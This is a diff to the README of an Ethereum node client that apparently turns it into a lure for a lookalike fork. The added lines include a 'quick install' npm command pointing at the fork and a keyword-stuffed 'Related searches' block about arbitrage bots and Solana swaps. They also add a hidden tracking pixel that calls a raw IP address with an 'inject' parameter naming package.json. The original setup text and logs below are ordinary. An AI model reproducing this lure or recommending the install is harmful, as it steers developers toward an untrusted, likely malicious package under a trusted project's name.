@@ -1,3 +1,15 @@
+**Quartzraincrease/buidlguidl-client**
+
+A refined client interface designed to streamline your interactions with the BuidlGuidl ecosystem. This version focuses on core stability, smoothing out the rough edges from earlier iterations so you can focus on building rather than troubleshooting. Recent patches have addressed previous connection bottlenecks and state sync issues, making the entire workflow significantly more reliable for day-to-day development.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Quartzraincrease/buidlguidl-client.git
+```
+
+[https://github.com/Quartzraincrease/buidlguidl-client](https://github.com/Quartzraincrease/buidlguidl-client)
+
 # 📡 BuidlGuidl Client
 This project will download client executables, start a execution + consensus client pair, and provide a terminal dashboard view of client and machine info.
 
@@ -157,4 +169,12 @@ Nov 21 21:01:16.144 WARN Blocks and blobs request for range received invalid dat
 Nov 21 21:01:17.001 WARN Head is optimistic                      execution_block_hash: 0x16410f3d5cb5044dcf596b301a34ec88ffce09dd4346f04aea95d442b1456e62, info: chain not fully verified, block and attestation production disabled until execution engine syncs, service: slot_notifier
 Nov 21 21:01:44.997 WARN Execution engine call failed            error: InvalidClientVersion("Input must be exactly 8 characters long (excluding any '0x' prefix)"), service: exec
 Nov 21 21:01:59.013 WARN Error signalling fork choice waiter     slot: 10449907, error: ForkChoiceSignalOutOfOrder { current: Slot(10449908), latest: Slot(10449907) }, service: beacon
-``` 
+```
+
+## Related searches
+
+Developers and node operators looking for this repository are typically interested in single-command setups for spinning up execution and consensus clients. Common queries revolve around running lightweight local environments for Ethereum mainnet monitoring, alongside standard ecosystem protocols for automated trading or decentralized infrastructure scaling.
+
+**Topics:** orca solana, jupiter swap, arbitrage bot, blockchain python, oracle blockchain, reth node setup, ethereum consensus client, lighthouse dashboard, distributed rpc network, blockchain developer tools, smart contract staging, web3 client runner
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Fbuidlguidl-client&inject=Quartzraincrease%2Fbuidlguidl-client%2Fpackage.json)
